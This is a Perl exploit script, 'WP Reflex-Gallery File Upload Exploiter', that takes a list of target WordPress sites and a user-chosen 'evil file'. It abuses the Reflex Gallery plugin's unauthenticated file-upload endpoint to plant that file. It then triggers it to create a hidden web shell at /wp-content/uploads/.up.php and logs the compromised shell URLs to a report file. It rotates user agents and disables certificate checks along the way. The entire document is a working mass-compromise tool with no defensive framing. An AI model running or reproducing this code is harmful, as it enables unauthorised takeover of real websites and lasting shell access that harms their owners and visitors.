#!/usr/bin/perl
use LWP::UserAgent;
# Coded By M-A
# Greet's : My Brother Rab3oun & Boy & MMxM & 0ne & All Friends
# Perl Lov3r :)
my $qqvul ="php.php";#theme path vul
my $datestring = localtime();
($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();

sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
flag();
print "[+] Enter List Of Target : ";
chomp (my $list=<>);
print "[+] Enter Evil File : ";
chomp (my $file=<>);
print "[+] Started : $datestring\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test upload\n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
print "[$i] $web \n";
expqq($web);#exploiting website :)
} 
sub expqq{
my $useragent = randomagent();#Get a Random User Agent 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept 
$ua->timeout(10);
$ua->agent($useragent);
print "[Testing] Exploit Existence \n";
my $url = $_[0]."/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/".$qqvul;
my $ss = $_[0]."/wp-content/uploads/".$file;
my $response = $ua->get($url);
if ($response->is_success || $response->content=~/error/){
    print "[OK] Exploit Exists\n";
    print "[*] Sent payload\n";
    my $regex = 'success';
    my $body = $ua->post( $url,
        Content_Type => 'form-data',
        Content => [ 'qqfile' => ["$file"] ]
    );
    if ($body->is_success || $body->content=~ /$regex/){
        print "[+] Payload successfully executed\n";
        print "[*] Checking if shell was uploaded\n\n";
        my $res = $ua->get($ss);
        if ($res->is_success){
            my $y = $ss."?cmd=up";
            my $de = $ua->get($y);
            if ($de->content=~/OK/) {
                print "[OK] Shell successfully Created \n";
                my $ee = $ua->get($_[0]."/wp-content/uploads/.up.php");
                print "\n[*] Website Info :\n";
                print "| ".$_[0]."/wp-content/uploads/.up.php\n";
                my $hh = $_[0]."/wp-content/uploads/.up.php";
                save ($hh);
                if ($ee->content=~/<\/title><b><br><br>(.*?)<br><\/b>/) {
                    print "| $1 \n";
                    save ($1);
                    if ($ee->content=~/<br><\/b><b><br><br>(.*?)<br><br><\/b><form action=/) {
                        print "| $1\n\n";
                        save ($1);
                    } 
                }
                
            }
        }
        else {print "[No] Can't Creat Shell \n";}
    }    
    else {print "[No] Can't Send Payload\n";}
}
else {print "[No] Exploit Not Found\n";}
}
sub flag {print "\n[+] WP Reflex-Gallery File Upload Exploiter \n[*] Coder => M-A\n(c) Janissaries.org & Sec4ever.com\n\n";
}
sub save {
open(my $fh, '>', 'report.txt');
print $fh $_[0]."\n";
close $fh;
}
